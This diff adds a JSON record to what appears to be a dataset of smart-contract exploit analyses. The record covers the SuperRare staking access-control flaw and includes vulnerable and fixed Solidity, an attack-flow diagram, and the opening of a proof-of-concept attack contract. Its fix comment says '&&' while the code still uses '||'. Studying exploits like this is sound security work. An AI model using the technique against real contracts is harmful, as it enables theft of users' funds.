@@ -1,0 +1,42 @@
+{
+ "id": "2025__2025-07-28_SuperRare_AccessControl_ETH",
+ "source_file": "2025/2025-07-28_SuperRare_AccessControl_ETH.md",
+ "title": "SuperRare — Access Control Vulnerability (Inverted Condition Logic) Analysis",
+ "date": "2025-07-28",
+ "protocol": "SuperRare",
+ "chain": "Ethereum Mainnet",
+ "loss_raw": "~$730,000 (11,907,874 RARE tokens, at RARE price at time of attack)",
+ "loss_usd": 730000.0,
+ "root_cause": "`||` error in `updateMerkleRoot()` — inverted access control condition allows anyone to modify the Merkle root",
+ "attack_tx": "0xd81375...3c1",
+ "vulnerable_contract": null,
+ "classes": [
+  "access-control"
+ ],
+ "code_before": [
+  "// ❌ Vulnerable: || operator makes condition always true → anyone passes\nfunction updateMerkleRoot(bytes32 newRoot) external override {\n    require(\n        (msg.sender != owner() || msg.sender != address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)),\n        \"Not authorized to update merkle root\"\n    );\n    // ❌ The require condition above is always true by De Morgan's law:\n    //    For any arbitrary address X:\n    //    - X != owner()  → true (attacker is not the owner)\n    //    - X != 0xc2F3... → true (attacker is not that address)\n    //    - true || true  → true (always passes)\n    \n    if (newRoot == bytes32(0)) revert EmptyMerkleRoot();\n    currentClaimRoot = newRoot;    // ❌ Attacker sets root to any desired value\n    currentRound++;\n    emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);\n}",
+  "// ❌ Vulnerable: forged proof passes against Merkle root controlled by attacker\nfunction claim(\n    uint256 amount,\n    bytes32[] calldata proof\n) public override nonReentrant {\n    // ❌ verifyEntitled validates against currentClaimRoot injected by attacker\n    if (!verifyEntitled(_msgSender(), amount, proof))\n        revert InvalidMerkleProof();\n    if (lastClaimedRound[_msgSender()] >= currentRound)\n        revert AlreadyClaimed();\n\n    lastClaimedRound[_msgSender()] = currentRound;\n    _token.safeTransfer(_msgSender(), amount);  // ❌ Entire balance can be drained\n    emit TokensClaimed(currentClaimRoot, _msgSender(), amount, currentRound);\n}\n\nfunction verifyEntitled(\n    address recipient,\n    uint256 value,\n    bytes32[] memory proof\n) public view override returns (bool) {\n    bytes32 leaf = keccak256(abi.encodePacked(recipient, value));\n    // ❌ MerkleProof.verify validates against currentClaimRoot set by attacker\n    return MerkleProof.verify(proof, currentClaimRoot, leaf);\n}",
+  "Attacker (0x5B9B4B)\n    │\n    │ 1. Deploy attack contract\n    ▼\n┌──────────────────────────────────────────┐\n│         Attack Contract                  │\n│         0x2073111E...                    │\n└──────────────────────────────────────────┘\n    │\n    │ 2. Call attack() function\n    │   (newRoot = arbitrary hash controlled by attacker)\n    │\n    ▼\n┌──────────────────────────────────────────────────────────────────┐\n│ RareStakingV1 (Proxy: 0x3f4D74...  Implementation: 0xfFB512...)  │\n│                                                                  │\n│  Step 2-A: updateMerkleRoot(fakeRoot)                            │\n│    require(msg.sender != owner() || msg.sender != 0xc2F3...)     │\n│    ← Condition always true → passes!                             │\n│    currentClaimRoot = fakeRoot  ← ❌ Merkle root replaced        │\n│    currentRound++  (1 → 2 → 3)                                   │\n│                                                                  │\n│  Step 2-B: claim(totalBalance, emptyProof)                       │\n│    leaf = keccak256(abi.encodePacked(attacker, totalBalance))    │\n│    MerkleProof.verify([], fakeRoot, leaf)                        │\n│    ← fakeRoot is a tree where leaf is the root → empty proof passes! │\n│    _token.safeTransfer(attacker, 11,907,874 RARE)                │\n└──────────────────────────────────────────────────────────────────┘\n    │\n    │ 3. Transfer full RARE token balance\n    ▼\n┌─────────────────────────────────────┐\n│ Attack Contract 0x08947c...         │\n│ Received: 11,907,874 RARE (~$730K)  │\n└─────────────────────────────────────┘"
+ ],
+ "code_after": [
+  "// ✅ Fixed: using && operator → only owner or specific address passes\nfunction updateMerkleRoot(bytes32 newRoot) external override {\n    require(\n        (msg.sender == owner() || msg.sender == address(0xc2F394a45e994bc81EfF678bDE9172e10f7c8ddc)),\n        \"Not authorized to update merkle root\"\n    );\n    // ✅ Meaning of fixed condition:\n    //    Only passes if msg.sender is the owner or an approved address\n    \n    if (newRoot == bytes32(0)) revert EmptyMerkleRoot();\n    currentClaimRoot = newRoot;\n    currentRound++;\n    emit NewClaimRootAdded(newRoot, currentRound, block.timestamp);\n}",
+  "// ✅ Fixed: if access control in the Merkle root update function is correct, this function is safe\n// Additional defense: set withdrawal cap\nfunction claim(\n    uint256 amount,\n    bytes32[] calldata proof\n) public override nonReentrant {\n    if (!verifyEntitled(_msgSender(), amount, proof))\n        revert InvalidMerkleProof();\n    if (lastClaimedRound[_msgSender()] >= currentRound)\n        revert AlreadyClaimed();\n\n    // ✅ Additional defense: enforce per-claim cap (example)\n    require(amount <= maxClaimPerRound, \"Exceeds max claim\");\n    \n    lastClaimedRound[_msgSender()] = currentRound;\n    _token.safeTransfer(_msgSender(), amount);\n    emit TokensClaimed(currentClaimRoot, _msgSender(), amount, currentRound);\n}"
+ ],
+ "steps": [
+  "1. Deploy attack contract",
+  "2. Call attack() function",
+  "Step 2-A: updateMerkleRoot(fakeRoot)",
+  "← Condition always true → passes!",
+  "currentRound++ (1 → 2 → 3)",
+  "Step 2-B: claim(totalBalance, emptyProof)",
+  "← fakeRoot is a tree where leaf is the root → empty proof passes!",
+  "3. Transfer full RARE token balance",
+  "1 | `NewClaimRootAdded` | Staking Proxy | Fake Merkle root registered (round=3)",
+  "2 | `Transfer` | RARE Token | Staking → Attack Contract: 11,907,874 RARE",
+  "3 | `TokensClaimed` | Staking Proxy | Claim event recorded",
+  "4 | (undecoded) | Attack Contract | Internal completion event"
+ ],
+ "other_code": [
+  "// SPDX-License-Identifier: MIT\n// Source: DeFiHackLabs — SuperRare Exploit PoC\n// Fork block: 23,016,422 (immediately before attack)\n\npragma solidity ^0.8.0;\n\n// Vulnerable contract interface\ninterface IRareStaking {\n    function updateMerkleRoot(bytes32 newRoot) external;\n    function claim(uint256 amount, bytes32[] calldata proof) external;\n    function token() external view returns (address);\n}\n\ninterface IERC20 {\n    function balanceOf(address) external view returns (uint256);\n    function transfer(address, uint256) external returns (bool);\n}\n\n// PoC attack contract\ncontract AttackContract {\n    address public owner;\n    IRareStaking public target;       // Vulnerable staking contract\n    IERC20 public rareToken;          // RARE token\n\n    constructor(address _target) {\n        owner"
+ ]
+}
